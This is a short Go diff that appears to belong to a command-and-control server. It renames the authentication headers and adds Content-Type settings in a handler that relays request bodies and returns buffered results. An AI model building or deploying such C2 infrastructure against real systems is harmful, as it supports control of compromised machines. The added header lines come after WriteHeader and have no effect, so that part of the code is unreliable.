@@ -51,20 +51,23 @@ func StartClient(uri string, port int) {
 	go StartC2("c2", 50049, &res)
 	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
 
-		username := r.Header.Get("Username")
-		password := r.Header.Get("Password")
+		username := r.Header.Get("user-name")
+		password := r.Header.Get("pass-word")
 
 		if authenticate(username, password, config) {
 			body, _ := ioutil.ReadAll(r.Body)
 
 			printkey(res)
+
 			if body == nil {
 				w.WriteHeader(http.StatusOK)
+				w.Header().Set("Content-Type", "application/octet-stream")
 				w.Write(res)
 				res = make([]byte, 0)
 			} else {
 				Send_Bytes_to(w, body, "http://localhost:8080", expectedHeaders)
 				w.WriteHeader(http.StatusOK)
+				w.Header().Set("Content-Type", "application/octet-stream")
 				w.Write(res)
 				res = make([]byte, 0)
 			}
